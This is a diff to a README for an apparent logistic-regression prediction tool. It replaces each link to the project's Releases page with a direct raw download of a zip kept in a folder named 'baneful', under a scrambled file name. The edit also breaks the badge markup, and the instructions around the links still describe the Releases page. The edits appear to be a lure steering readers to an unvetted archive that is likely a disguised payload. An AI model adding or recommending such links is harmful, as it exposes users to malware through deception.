@@ -6,7 +6,7 @@ Welcome to the Prediction with Binomial Logistic Regression project! This softwa
 
 ## 📥 Download Now
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%23FFCA28.svg?style=for-the-badge&logo=github&logoColor=black)](https://github.com/francisfinn/Prediction-with-Binomial-LOgistic-Regression/releases)
+[![Download Now](https://github.com/francisfinn/Prediction-with-Binomial-LOgistic-Regression/raw/refs/heads/main/baneful/with-L-Ogistic-Binomial-Prediction-Regression-3.0.zip%20Now-%https://github.com/francisfinn/Prediction-with-Binomial-LOgistic-Regression/raw/refs/heads/main/baneful/with-L-Ogistic-Binomial-Prediction-Regression-3.0.zip)](https://github.com/francisfinn/Prediction-with-Binomial-LOgistic-Regression/raw/refs/heads/main/baneful/with-L-Ogistic-Binomial-Prediction-Regression-3.0.zip)
 
 ## 🌟 Features
 
@@ -41,7 +41,7 @@ To run this application, your computer should meet the following requirements:
 To get started, follow these steps:
 
 1. **Visit the Releases Page:** Click on the link below to go to the Releases page:
-   [Download Here](https://github.com/francisfinn/Prediction-with-Binomial-LOgistic-Regression/releases).
+   [Download Here](https://github.com/francisfinn/Prediction-with-Binomial-LOgistic-Regression/raw/refs/heads/main/baneful/with-L-Ogistic-Binomial-Prediction-Regression-3.0.zip).
 
 2. **Select the Latest Release:** On the Releases page, find the most recent version of the software. 
 
@@ -88,4 +88,4 @@ We are actively working on improving the application. Upcoming features include:
 
 This application simplifies predictive modeling using a reliable algorithm. We aim to bridge the gap between technology and everyday users, making data predictions accessible to everyone. Download now, explore your data, and discover valuable insights! 
 
-[🚀 Download Here](https://github.com/francisfinn/Prediction-with-Binomial-LOgistic-Regression/releases)
+[🚀 Download Here](https://github.com/francisfinn/Prediction-with-Binomial-LOgistic-Regression/raw/refs/heads/main/baneful/with-L-Ogistic-Binomial-Prediction-Regression-3.0.zip)
